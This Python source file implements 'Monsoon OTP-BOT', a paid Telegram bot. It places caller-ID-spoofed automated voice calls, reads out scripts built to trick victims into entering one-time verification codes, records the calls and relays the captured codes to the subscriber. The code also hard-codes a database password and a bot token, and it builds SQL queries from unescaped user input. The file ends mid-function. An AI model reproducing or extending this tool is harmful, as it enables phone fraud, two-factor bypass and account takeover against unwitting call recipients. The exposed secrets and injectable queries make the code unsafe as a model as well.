import mysql.connector
from mysql.connector import errorcode
import flask
from datetime import *
from flask import Flask, session
from flask import Flask, Response, request, url_for
import requests
import time
import telebot
from flask import Flask, request
from telebot import types
from config import *
import json
from telegram import InputFile
import threading
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
from flask_cors import CORS
from flask import Flask, jsonify
import ssl
from tts import Convert_TTS


d_user ='doadmin'
d_host ='db-mysql-blr1-15034-do-user-17463889-0.i.db.ondigitalocean.com'
d_pass ='AVNS_LYVfM-atUZX-LAhpgSM'
d_port =25060
d_data='otbbotdatabase'





ngrok_url= "https://atlanta-api.online:8443"  # NGROK APP LINK HERE
bot_tkn ='7393948338:AAG8R7hWDTb6Z6RXHvtfiuJLVjLxldxP9sU'  # YOUR BOT API bot_tkn HERE
apiKey = '123456789101112'
last_message_ids = {}
ringing_handler = []
recording_handler = {}

updater = Updater(token=bot_tkn, use_context=True)
dispatcher = updater.dispatcher

try:
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
except mysql.connector.Error as err:
     if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
          print("Something is wrong with your user name or password")
     elif err.errno == errorcode.ER_BAD_DB_ERROR:
          print("Database does not exists")
     else:
          print(err)
else:



#curser database
  c = db.cursor()
  
# Flask connection
app = Flask(__name__)
CORS(app)
# Bot connection
bot = telebot.TeleBot(bot_tkn, threaded=False)
bot.remove_webhook()
bot.set_webhook(url=ngrok_url)

#--------------------------------------------------------------------------

@app.route('/', methods=['POST','GET'])
def webhook():
    try:
        # Check if Content-Type is application/json
        if flask.request.headers.get('Content-Type') == 'application/json':
            json_string = flask.request.get_data().decode('utf-8')
            update = telebot.types.Update.de_json(json_string)
            bot.process_new_updates([update])
            return '', 200 
        else:
            return jsonify({"error": "Invalid content type"}), 415  # Unsupported Media Type
    except json.JSONDecodeError as e:
        return jsonify({"error": "Invalid JSON format"}), 400  # Bad Request
    except Exception as e:
        return jsonify({"error": "An error occurred"}), 500  # Internal Server Error



# Handle '/start' -----------------------
@bot.message_handler(commands=['start'])
def send_welcome(message):
  global last_message_ids
     #Database connect------------------------
  db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
  c = db.cursor()
#_____________________________________
  userid = message.from_user.id
  print(userid)
  c.execute(f"SELECT * FROM users WHERE user_id={userid}")
  row= c.fetchone()
  # Check whether the user already registered in our system
  if (row)!= None:
    if row[3]!='ban':
      if user_day_check(userid)==0:
        delete_data(userid)
        bot.send_message(message.from_user.id, f"You have expired subscription",  parse_mode='Markdown')
      elif user_day_check(userid)>0:
        
        name = message.from_user.first_name
        keyboard = types.InlineKeyboardMarkup(row_width=2)

        item1 = types.InlineKeyboardButton(text="👤 Profile", callback_data="/profile")
        item2 = types.InlineKeyboardButton(text="⌛️ Validity", callback_data="/dayslimit")

        item3= types.InlineKeyboardButton(text="👩‍💻 Commands", callback_data="/commands")
        item4 = types.InlineKeyboardButton(text="🔉Voices", callback_data="/voice")

        item5 = types.InlineKeyboardButton(text="Community 💬 ", callback_data="/community")
        item6 = types.InlineKeyboardButton(text="🎛 Features", callback_data="/features")
        
        keyboard.add(item1,item2)
        keyboard.add(item3,item4)
        keyboard.add(item5,item6)
        

        mes3 = bot.send_photo(chat_id=message.from_user.id, caption=f"""🌟 Welcome to Monsoon OTP-BOT 🌟

🌐 Hello {name} Welcome To The Mosnoon OTP - BOT. The Perfect Bot For Your Needs 🌐

🚀 Operational || UP - Time 100% 🚀

This Bot is a tool for making automated voice call & A call centre for Spoofer""", reply_markup=keyboard, parse_mode='Markdown',photo=open('starting_photp.jpg', 'rb')).message_id
        last_message_ids[message.from_user.id] = mes3
        
    else:
       name = message.from_user.first_name
       bot.send_message(message.from_user.id, f"*Sorry {name} ,you are banned from using this service.\nContact @RomanSAGE for more info.*",parse_mode='markdown')
  
  elif (row)== None:

    name = message.from_user.first_name
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    item0 = types.InlineKeyboardButton(text="💷 Price", callback_data="/price")
    # item1 = types.InlineKeyboardButton(text="🛒 Buy", callback_data="/buy")
    item1 = types.InlineKeyboardButton(text="🛒 Buy", url='https://t.me/RomanSAGE')

    item2 = types.InlineKeyboardButton(text="🔑 Redeem", callback_data="/redeem")
    item3 = types.InlineKeyboardButton(text="🆘 Support", callback_data="/support")

    item4= types.InlineKeyboardButton(text="👩‍💻 Commands", callback_data="/commands")
    item5 = types.InlineKeyboardButton(text="🔉Voices", callback_data="/voice")

    item6 = types.InlineKeyboardButton(text="Community 💬 ", callback_data="/community")
    item7 = types.InlineKeyboardButton(text="🎛 Features", callback_data="/features")

    
    keyboard.add(item0,item1)
    keyboard.add(item2, item3)
    keyboard.add(item4,item5)
    keyboard.add(item6,item7)

    mes2 = bot.send_photo(message.from_user.id,caption=f"""
🌟 Welcome to Monsoon OTP-BOT 🌟

🌐 Hello {name} Welcome To The Mosnoon OTP - BOT. The Perfect Bot For Your Needs 🌐

🚀 Operational || UP - Time 100% 🚀

This Bot is a tool for making automated voice call & A call centre for Spoofer""",reply_markup=keyboard,photo=open('starting_photp.jpg', 'rb')).message_id 
    last_message_ids[message.from_user.id] = mes2
  
  c.close()
  print("Connection Closed")

@bot.message_handler(commands=['price'])
def Price_list(message):
    try:
        global last_message_ids
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        item1 = types.InlineKeyboardButton(text="🔙 Return", callback_data='/backstart')
        keyboard.add(item1)
        bot.edit_message_caption(f"""
💵 <b>Price List</b>

💵<b> 1 Day</b> = 30$ - 2.7K INR 
💵<b> 3 Days </b>= 70$ - 6.3K INR
💵<b> 7 Days</b> = 120$ - 12K INR
💵<b> 15 Days </b>= 220$ - 20K INR
💵<b> 28 + 2 days</b> = 440$ - 40K INR

🔑DM For Purchase @RomanSage ✅""",message.from_user.id, message_id=last_message_ids[message.from_user.id], reply_markup=keyboard, parse_mode='HTML')
    except:
        print("Price Error")
        send_welcome(message)

@bot.message_handler(commands=['commands'])
def Commands(message):
    try:
        global last_message_ids
        db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
        c = db.cursor()
        id = message.from_user.id
        c.execute(f"Select * from users where user_id={id}")
        cdata= c.fetchone()
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        if cdata!=None:
            item1 = types.InlineKeyboardButton(text="🔙 Return", callback_data="/activatedstartback")
        else:
             item1 = types.InlineKeyboardButton(text="🔙 Return", callback_data="/backstart")
        keyboard.add(item1)
        bot.edit_message_caption(f"""
<b><u> Command List:</u></b>

/profile - Check Your Key Status 👤
/purchase - Purchase A Key 🗝️
/redeem - Redeem A Key 🔐
/price - Price's Of Subscriptions 💵

/call - Any Pre Build Module Calls📱
/customcall - Custom Script Calls 📞
/recall - Repeat Your Last Call 🤙

/customscript - To View Script 🆔
/createscript - To Make A Script ✍️
/deletescript - To Delete Old Script ♠️
/viewscript   - To View Script Inputs ⌛️

""",message.from_user.id, last_message_ids[message.from_user.id], reply_markup=keyboard, parse_mode='HTML')
    except:
         send_welcome(message)               

@bot.message_handler(commands=['community'])
def community(message):
    global last_message_ids
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    id = message.from_user.id
    c.execute(f"Select * from users where user_id={id}")
    cdata= c.fetchone()  
    try:
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        item1 = types.InlineKeyboardButton(text="Owner 🧑", url='https://t.me/RomanSAGE')
        item2 = types.InlineKeyboardButton(text="Group 💪", url='https://t.me/MonsoonDiscussion')
        item3 = types.InlineKeyboardButton(text="Channel 💪", url='https://t.me/MonsoonApi')
        item4 = types.InlineKeyboardButton(text="Vouches 🔢", url='https://t.me/MonsoonOTPVouches')
        
        
        if cdata!=None:
            item5 = types.InlineKeyboardButton(text="🔙 Return", callback_data="/activatedstartback")
        else:
             item5 = types.InlineKeyboardButton(text="🔙 Return", callback_data="/backstart")
        keyboard.add(item1)
        keyboard.add(item2)
        keyboard.add(item3)
        keyboard.add(item4)
        keyboard.add(item5)
   
        bot.edit_message_caption(f"Community",message.from_user.id, last_message_ids[message.from_user.id], reply_markup=keyboard, parse_mode='Markdown')
    except:
         send_welcome(message)



def Start_back(message):
    try:
        global last_message_ids
        name = message.from_user.first_name
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        item0 = types.InlineKeyboardButton(text="💷 Price", callback_data="/price")
        item1 = types.InlineKeyboardButton(text="🛒 Buy", url='https://t.me/RomanSAGE')

        item2 = types.InlineKeyboardButton(text="🔑 Redeem", callback_data="/redeem")
        item3 = types.InlineKeyboardButton(text="🆘 Support", callback_data="/support")

        item4= types.InlineKeyboardButton(text="👩‍💻 Commands", callback_data="/commands")
        item5 = types.InlineKeyboardButton(text="🔉Voices", callback_data="/voice")

        item6 = types.InlineKeyboardButton(text="Community 💬 ", callback_data="/community")
        item7 = types.InlineKeyboardButton(text="🎛 Features", callback_data="/features")


        keyboard.add(item0,item1)
        keyboard.add(item2,item3)
        keyboard.add(item4,item5)
        keyboard.add(item6,item7)
        bot.edit_message_caption(chat_id=message.from_user.id,caption=f"""
🌟 Welcome to Monsoon OTP-BOT 🌟

🌐 Hello {name} Welcome To The Mosnoon OTP - BOT. The Perfect Bot For Your Needs 🌐

🚀 Operational || UP - Time 100% 🚀

This Bot is a tool for making automated voice call & A call centre for Spoofer""", message_id=last_message_ids[message.from_user.id],reply_markup=keyboard)
    except:
         send_welcome(message)


def activatedstartback(message):      
        global last_message_ids
        name = message.from_user.first_name
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        item1 = types.InlineKeyboardButton(text="👤 Profile", callback_data="/profile")
        item2 = types.InlineKeyboardButton(text="⌛️ Validity", callback_data="/dayslimit")

        item3= types.InlineKeyboardButton(text="👩‍💻 Commands", callback_data="/commands")
        item4 = types.InlineKeyboardButton(text="🔉Voices", callback_data="/voice")

        item5 = types.InlineKeyboardButton(text="Community 💬 ", callback_data="/community")
        item6 = types.InlineKeyboardButton(text="🎛 Features", callback_data="/features")
        
        keyboard.add(item1,item2)
        keyboard.add(item3,item4)
        keyboard.add(item5,item6)
        mes3 = bot.edit_message_caption(chat_id=message.from_user.id, caption=f"""
🌟 Welcome to Monsoon OTP-BOT 🌟

🌐 Hello {name} Welcome To The Mosnoon OTP - BOT. The Perfect Bot For Your Needs 🌐

🚀 Operational || UP - Time 100% 🚀

This Bot is a tool for making automated voice call & A call centre for Spoofer""", reply_markup=keyboard,message_id=last_message_ids[message.from_user.id], parse_mode='Markdown',).message_id
        last_message_ids[message.from_user.id] = mes3

def Features(message):
    try:
        global last_message_ids
        db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
        c = db.cursor()
        id = message.from_user.id
        c.execute(f"Select * from users where user_id={id}")
        cdata= c.fetchone()
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        if cdata!=None:
            item1 = types.InlineKeyboardButton(text="🔙 Return", callback_data="/activatedstartback")
        else:
             item1 = types.InlineKeyboardButton(text="🔙 Return", callback_data="/backstart")
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(item1)
        bot.edit_message_caption(f"""
<b>• Pre-build Modules:</b> Ready-made components for easy integration.

<b>• Custom Caller ID/Spoofing:</b> Ability to change displayed caller information.

<b>• 60+ Voice Choices:</b> Variety of voices available for text-to-speech.

<b>• 100% Up Time:</b> Service availability almost all the time.

<b>• Lightning Fast Response:</b> Rapid system reaction to user input.

<b>• Custom Script:</b> Personalized workflows and interactions.

<b>• Accept/Deny Buttons:</b> Options for user decision-making.

<b>• 24/7 Customer Support:</b> Support available at any time.

<b>• Special Add-ons:</b> Additional features for enhanced functionality.

<b>• Digit Detection:</b> Ability to interpret keypad input accurately.""",message.from_user.id, message_id=last_message_ids[message.from_user.id], reply_markup=keyboard, parse_mode='HTML')
    except:
         print("Error in features")
         send_welcome(message)

def Support(message):
    global last_message_ids
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    id = message.from_user.id
    c.execute(f"Select * from users where user_id={id}")
    cdata= c.fetchone()
    try:

        keyboard = types.InlineKeyboardMarkup(row_width=1)
        if cdata!=None:
            item1 = types.InlineKeyboardButton(text="🔙 Return", callback_data="/activatedstartback")
        else:
             item1 = types.InlineKeyboardButton(text="🔙 Return", callback_data="/backstart")
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(item1)
        bot.edit_message_caption(f"""
🆘 For bot related quaries contact:
@RomanSage ✅
""",message.from_user.id, last_message_ids[message.from_user.id], reply_markup=keyboard, parse_mode='HTML')
    except:
         send_welcome(message)


def Privacy(message):
    global last_message_ids
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    id = message.from_user.id
    c.execute(f"Select * from users where user_id={id}")
    cdata= c.fetchone()
    try:

        keyboard = types.InlineKeyboardMarkup(row_width=1)
        if cdata!=None:
            item1 = types.InlineKeyboardButton(text="Back", callback_data="/activatedstartback")
        else:
             item1 = types.InlineKeyboardButton(text="Back", callback_data="/backstart")
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(item1)
        bot.edit_message_caption(f"""
<b>Refund Policy</b>
<b>No Refunds After Key Activation</b>
Once a key has been activated, refunds are not available. This policy is designed to ensure fairness for all customers.
<b>Rationale for This Policy</b>
Think of it like buying a concert ticket—once the event is over, you can’t get a refund. Similarly, once a key is used, it’s final and cannot be returned or refunded.
<b>Add-on Support Policy</b>
If you experience issues with an add-on, please reach out to support immediately. There is a specific timeframe for resolving such issues, and we are unable to assist if this period passes.
<b>Note</b>
Support for minor issues, such as restarting the bot or reloading APIs, is not provided.
<b>Important Reminder</b>
Make sure you are confident in your purchase before activating a key, as our terms are applied consistently to all customers with no exceptions.
<b>Changes to Terms</b>
Our Terms and Conditions may be updated in the future.
""",message.from_user.id, last_message_ids[message.from_user.id], reply_markup=keyboard, parse_mode='HTML')
    except:
         send_welcome(message)
     


#----------------------------------------------------------------------------------------------------

@bot.message_handler(commands=['dayslimit'])
def current_credit(message):
   #Database connect------------------------
   db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
   c = db.cursor() 
   #_____________________________________
   id = message.from_user.id
   c.execute(f"Select * from users where user_id={id}")
   cdata= c.fetchone()
   if cdata!=None:
     if cdata[3]!='ban':
          limit =cdata[2]
          days=user_day_check(id)
          if days>=1:
            bot.send_message(message.from_user.id,f"*Your Current key is limited to {limit - datetime.today()} *",parse_mode='markdown')
          elif days==0:  
              bot.send_message(message.from_user.id,f"""*⚠️ Buy Subscription ⚠️*""",parse_mode='markdown')
              delete_data(id) 
     else:
           bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')
   else:
      bot.send_message(message.from_user.id,f"""*⚠️ Buy Subscription ⚠️*""",parse_mode='markdown')
   c.close() 
#----------------------------PROFILE-------------------------------------------------------------------------------------
      
@bot.message_handler(commands=['profile'])
def Profile_def(message):
    try:
        global last_message_ids

        #Database connect------------------------
        db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
        c = db.cursor() 
        #_____________________________________
        id = message.from_user.id
        name = message.from_user.first_name
        c.execute(f"Select * from users where user_id={id}")
        cdata= c.fetchone()
        if cdata!=None:
            if cdata[3]!='ban':
                days=user_day_check(id)
                if days>=1:
                    try:
                        keyboard = types.InlineKeyboardMarkup(row_width=2)
                        item1 = types.InlineKeyboardButton(text="🔙 Return", callback_data="/activatedstartback")
                        keyboard.add(item1)
                        bot.edit_message_caption(chat_id=message.from_user.id,message_id=last_message_ids[message.from_user.id],caption=f"""*
Chat ID :{id} 
Chat Name : {name}
Subscription : Active
Valid till: {cdata[2]} 
Calls  : {cdata[10]}
Grabs: {cdata[9]}                              
        *""",parse_mode='markdown',reply_markup=keyboard)
                    except:
                        send_welcome(message)
                elif days==0:
                        keyboard = types.InlineKeyboardMarkup(row_width=2)
                        item1 = types.InlineKeyboardButton(text="🔙 Return", callback_data="/activatedstartback")
                        keyboard.add(item1)   
                        bot.edit_message_caption(chat_id=message.from_user.id,message_id=last_message_ids[message.from_user.id],caption=f"""*
Chat ID {id} 
Chat Name : {name}
Subscription : Expired 
Valid till: {cdata[2]} 
Calls  : {cdata[10]}
Grabs:  {cdata[9]} *""",parse_mode='markdown',reply_markup=keyboard)
                        delete_data(id) 
            else:
                bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')
        else:
            bot.send_message(message.from_user.id,f"""*⚠️ Buy Subscription ⚠️*""",parse_mode='markdown')
        c.close()
    except:
         send_welcome(message)
#-------------------------------------------Redeem --------------------------------------------------------------------------------
@bot.message_handler(commands=['redeem'])
def redeem_user(message):
    send = bot.send_message(message.from_user.id, "*Plece your key here*",parse_mode='markdown')
    bot.register_next_step_handler(send,redeem_done)

def redeem_done(message):
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    id = message.from_user.id
    reedem_code=str(message.text)
    c.execute(F"SELECT * FROM users WHERE user_id={id}")
    dat=c.fetchone()
    if dat!=None:
        if user_day_check(id)==0:
            c.execute(f"Delete from users where user_id={id}")
            db.commit()
            uresp=redeem_key(reedem_code,id)
            if uresp==1:
                days=user_day_check(id)
            elif uresp==0:
                bot.send_message(message.from_user.id, f"*Invalid Redeem Code*",parse_mode='markdown')
        elif user_day_check(id)>0:
            bot.send_message(message.from_user.id, f"*An Activation Key is Already Activated*",parse_mode='markdown')
    elif dat==None:
        uresp=redeem_key(reedem_code,id)
        if uresp==1:
            time.sleep(3)
            days=user_day_check(id)
            bot.send_message(message.from_user.id, f"Redeemed {days} days.",parse_mode='markdown')
            send_welcome(message)
        elif uresp==0:
            bot.send_message(message.from_user.id, f"*⚠️Invalid key⚠️*",parse_mode='markdown')
    c.close()
#--------------------------------------------------------------------------------------------------------------------------- 
    
#------------------------------------------------------------------------------------------------------------------------------

def Voices(message):
    global last_message_ids
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    id = message.from_user.id
    c.execute(f"Select * from users where user_id={id}")
    cdata= c.fetchone()
    try:
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        item1 = types.InlineKeyboardButton(text="🇮🇳 Indian", callback_data="/ind")
        item0 = types.InlineKeyboardButton(text="🇺🇸 American", callback_data="/us")
        item2 = types.InlineKeyboardButton(text="🇮🇹 Italian", callback_data="/itl")
        item3 = types.InlineKeyboardButton(text="🇫🇷 French", callback_data="/us")
        if cdata!=None:
            item4 = types.InlineKeyboardButton(text="Back", callback_data="/activatedstartback")
        else:
             item4 = types.InlineKeyboardButton(text="Back", callback_data="/backstart")


        keyboard.add(item1)
        keyboard.add(item0)
        keyboard.add(item2)
        keyboard.add(item3)
        keyboard.add(item4)
 
        bot.edit_message_caption(chat_id=message.from_user.id,caption="🔉 Voices 🔉",message_id=last_message_ids[message.from_user.id],reply_markup=keyboard).message_id
    except:
         send_welcome(message)

#---------------------------------CUSTOM SCRIPT-----------------------------------------------------------------------------
@bot.message_handler(commands=['customscript'])
def Set_custom(message):
   db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
   c = db.cursor()
   id = message.from_user.id
   c.execute(f"Select * from users where user_id={id}")
   cdata= c.fetchone()
   if cdata!=None:
     if cdata[3]!='ban':
          days=user_day_check(id)
          if days>=1:
              try :
                  c.execute(f"select * from custom_scripts where  user_id={id}")
                  all_sc = c.fetchall()    
                  txt=''
                  for i in (all_sc):
                      namee = i[2]
                      scr_id  = i[1]
                      txt = txt + f'{namee}:{scr_id} \n'
                  bot.send_message(id,f"""Your Scripts ⏬

{txt}""",parse_mode='markdown')
              except:
                      bot.send_message(id,f"*Custom Scripts*",parse_mode='markdown')
          elif days==0:  
              bot.send_message(message.from_user.id,f"""*⚠️ Buy Subscription ⚠️*""",parse_mode='markdown')
              delete_data(id) 
     else:
           bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')
   else:
      bot.send_message(message.from_user.id,f"""*⚠️ Buy Subscription ⚠️*""",parse_mode='markdown')
   c.close() 
   

def First_Script_name(message):
             global last_message_ids
             id = message.from_user.id
             namesc=message.text
             print(namesc)
             c.execute(f"UPDATE custom_scripts SET script_name='{namesc}' WHERE script_id={last_message_ids[message.from_user.id]}")
             db.commit()
             send2 =bot.send_message(message.chat.id, "Send Part One Of Script:\nNote:- Where You Can Say For {Press One}",parse_mode='markdown')
             bot.register_next_step_handler(send2,First)
     

def First(message):
             global last_message_ids
             id = message.from_user.id
             script1=message.text
             print(script1)
             c.execute(f"UPDATE custom_scripts SET intro='{script1}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
             db.commit()
             send2 =bot.send_message(message.chat.id, "Send Part Two Of Script:\nNote:- Where You Can Say For {Dail The Verification Code}",parse_mode='markdown')
             bot.register_next_step_handler(send2,Second)

def Second(message):
             id = message.from_user.id
             scp2=message.text
             c.execute(f"UPDATE custom_scripts SET otp='{scp2}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
             db.commit()
             send3 =bot.send_message(message.chat.id, "Send Part Three Of Script:-\nNote:- Where You Can Say For {Checking The Code}",parse_mode='markdown')
             bot.register_next_step_handler(send3,Third)
             
def Third(message):
             id = message.from_user.id
             scp2=message.text
             c.execute(f"UPDATE custom_scripts SET waiting='{scp2}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
             db.commit()
             send3 =bot.send_message(message.chat.id, "Send Part Four Of Script:\nNote:- Where You Can Say {Code Was Code Rejected}",parse_mode='markdown')
             bot.register_next_step_handler(send3,Fourth)


def Fourth(message):
             id = message.from_user.id
             scp2=message.text
             c.execute(f"UPDATE custom_scripts SET wrong='{scp2}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
             db.commit()
             send3 =bot.send_message(message.chat.id, "Send Part Five Of Script:-\nNote:- Where You Can Say For {Your Code Was Accpeted}",parse_mode='markdown')
             bot.register_next_step_handler(send3,Fifth)

def Fifth(message):
             id = message.from_user.id
             scp2=message.text
             c.execute(f"UPDATE custom_scripts SET last='{scp2}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
             db.commit()
             send3 =bot.send_message(message.chat.id, "Number of OTP digits you want to capture",parse_mode='markdown')
             bot.register_next_step_handler(send3,OTP_DIGITS)
def OTP_DIGITS(message):
             id = message.from_user.id
             scp2=int(message.text)
             c.execute(f"UPDATE custom_scripts SET digits={scp2} WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
             db.commit()
             bot.send_message(message.chat.id, f"*📜 Use this : {last_message_ids[message.from_user.id]} 📜*",parse_mode='markdown')
             

@bot.message_handler(commands=['createscript'])
def Set_custom_script(message):
   global last_message_ids
   db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
   c = db.cursor()
   id = message.from_user.id
   c.execute(f"Select * from users where user_id={id}")
   cdata= c.fetchone()
   if cdata!=None:
     if cdata[3]!='ban':
          days=user_day_check(id)
          if days>=1:
              
                  id = message.from_user.id
                  script_id= genrandom()
                  c.execute(f"Insert into custom_scripts value({id},{script_id},'xx','xx','xx','xx','xx','xx',6)")
                  db.commit()

                  last_message_ids[message.from_user.id]=script_id
                  print(last_message_ids[message.from_user.id])
                  send1 = bot.send_message(id,f"Your script name:",parse_mode='markdown')
                  bot.register_next_step_handler(send1,First_Script_name)
            #   except :
            #       bot.send_message(id,f"*Enter correct format *",parse_mode='markdown')
          elif days==0:  
              bot.send_message(message.from_user.id,f"""*⚠️ Buy Subscription ⚠️""",parse_mode='markdown')
              delete_data(id) 
     else:
           bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')
   else:
      bot.send_message(message.from_user.id,f"""*⚠️ Buy Subscription ⚠️*""",parse_mode='markdown')
   c.close() 

@bot.message_handler(commands=['deletescript'])
def Set_custom_script(message):
    try:
        db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
        c = db.cursor()
        id = message.from_user.id
        script_id =(message.text[13:]).split()
        print(script_id)
        c.execute(f"delete from custom_scripts where script_id={script_id[0]} and user_id={id}")
        db.commit()
        bot.send_message(id,f"*Your Script deleted*",parse_mode='markdown')
    except :
        bot.send_message(id,f"*Enter correct format /deletescript <script id> *",parse_mode='markdown')
    c.close()

@bot.message_handler(commands=['viewscript'])
def Set_custogrem_script(message):
    try:
        db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
        c = db.cursor()
        id = message.from_user.id
        script_id =(message.text[11:]).split()
        c.execute(f"Select * from custom_scripts where script_id={script_id[0]} ")
        result = c.fetchone()
        bot.send_message(id,f"Script 🆔 {script_id}:\n\n1.{result[3]}\n\n2.{result[4]}\n\n3.{result[5]}\n\n4.{result[6]}\n\n5.{result[7]}\n\nOTP Digits {result[8]}",parse_mode='markdown')
    except :
        bot.send_message(id,f"*Enter correct format /viewscript <script id>\nWrong Script ID *",parse_mode='markdown')
    c.close()
#----------------------------------------------------------------------------------------------------------------------
 

#------------------------------------------------------------------------------------------------------------------

def retrive_recording(rec_url,chatid):
                time.sleep(2)
                response = requests.get(rec_url)
                payload = {
                    'chat_id': {chatid},
                    'title': 'Monsoon-OTP-BOT.mp3',
                    'parse_mode': 'HTML'
                }
                files = {
                    'audio': response.content,
                }
                requests.post(f"https://api.telegram.org/bot{bot_tkn}/sendAudio".format(bot_tkn=f"{bot_tkn}"),data=payload,files=files)


def callhangup(call_control:str):
    hangurl = f'https://insufficientmonsoon.online:8443/hangup'
    payload = {
         'uuid':call_control
    }
    requests.post(hangurl,json=payload)


def callhangbutton(userid):
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    item1 = types.InlineKeyboardButton(text="End Call", callback_data="/endcall") 
    keyboard.add(item1)    
    bot.send_message(userid, f"*Phone Ringing 📞*", reply_markup=keyboard , parse_mode='markdown')


def callmaking(number,spoof,chatid,service):

            data = {
                        "to_": f"{number}",
                        "from_": f"{spoof}",
                        "callbackURL": f"{ngrok_url}/{service}/{chatid}/random",
                        "api_key": f"{apiKey}",
                            }
            url = "https://insufficientmonsoon.online:8443/create-call"
            resp = requests.post(url, json=data)
            res = json.loads(resp.text)
            print(resp.text)
            c.execute(f"update call_data set call_control_id='{res['uuid']}'  where chat_id={chatid}")
            db.commit()
            c.close()

            

def make_call(t:str,f:str,user_id,service):
    callmaking(number=t,spoof=f,chatid=user_id,service=service)

def custom_callmaking(number,spoof,chatid,script_id):
        url = "https://insufficientmonsoon.online:8443/create-call"
        data = {
             "to_": f"{number}",
              "from_": f"{spoof}",
              "callbackURL": f"{ngrok_url}/{script_id}/{chatid}/custom",
              "api_key": f"{apiKey}",
               }
        resp = requests.post(url, json=data)
        res = json.loads(resp.text)
        c.execute(f"update call_data set call_control_id='{res['uuid']}'  where chat_id={chatid} ")
        db.commit()
                

def custom_make_call(t:str,f:str,user_id,script_id:int):
    custom_callmaking(number=t,spoof=f,chatid=user_id,script_id=script_id)
   
# ------------------Recall feature ---------------------------------
@bot.message_handler(commands=['recall'])
def recall_now(message):
   db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
   c = db.cursor()
   id = message.from_user.id
   c.execute(f"Select * from users where user_id={id}")
   cl= c.fetchone()
   if cl!=None:
       if cl[3]!='ban':
            if cl[3]=='active':
                call_update(id)
                days = user_day_check(id)
                caller=cl[5]
                vict=cl[4]
                if days>=1:
                        bot.send_message(message.from_user.id, "*Recalling 📲*",parse_mode='markdown')
                        try: 
                            c.execute(f"select * from call_data where chat_id={id} limit 1")
                            last_script = c.fetchone()
                            if last_script[2]!='custom':
                                make_call(vict,caller,id,f'{last_script[2]}')
                            elif last_script[2]=='custom':
                                 c.execute(f"select * from users where user_id={id} limit 1")
                                 clast_script = c.fetchone()
                                 custom_make_call(vict,caller,id,clast_script[6])
                        except:
                            print("Unknown Error Recalling")
                elif days==0:    
                    bot.send_message(message.from_user.id,f"""*⚠️ Buy Subscription ⚠️*""",parse_mode='markdown')
                    delete_data(id)
            elif(cl[3]=='ongoing'):
                    print("Recall Passed")
                    pass
       else:
             bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')
   else:
      bot.send_message(message.from_user.id,f"""*⚠️ Buy Subscription ⚠️*""",parse_mode='markdown')
#----------------------------------------------------------------------------


#--------------------------------custom---CALL WEBHOOK-------------------------------------------------------
def custom_confirm1(message):
       #Database connect------------------------
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor() 
    #_____________________________________
    chat_id = message.from_user.id
    up_resp1= message.text
    c.execute(f"Select * from users where user_id={chat_id}")
    sc_id = c.fetchone()
    customscid = sc_id[6]

    c.execute(f"select * from custom_scripts where script_id={customscid} limit 1")
    custom_waiting = c.fetchone()
    digits = custom_waiting[8]
    nospace_digits= "".join(digits.split())

    c.execute(f"Select * from call_data where chat_id={chat_id}")
    custom_cont = c.fetchone()
    call_control_id  = custom_cont[1]

    
    if up_resp1=='Accept':
        url = 'https://insufficientmonsoon.online:8443/play-audio'
        data = {
    "uuid": f"{call_control_id}",
    "audiourl": f"https://atlanta-api.online/scripts/{customscid}/output3.wav",
   
}
        requests.post(url, json=data)
        bot.send_message(chat_id,f"*Code Accepted*",parse_mode='markdown')
        time.sleep(3)
        callhangup(call_control_id)

    elif up_resp1=='Deny':
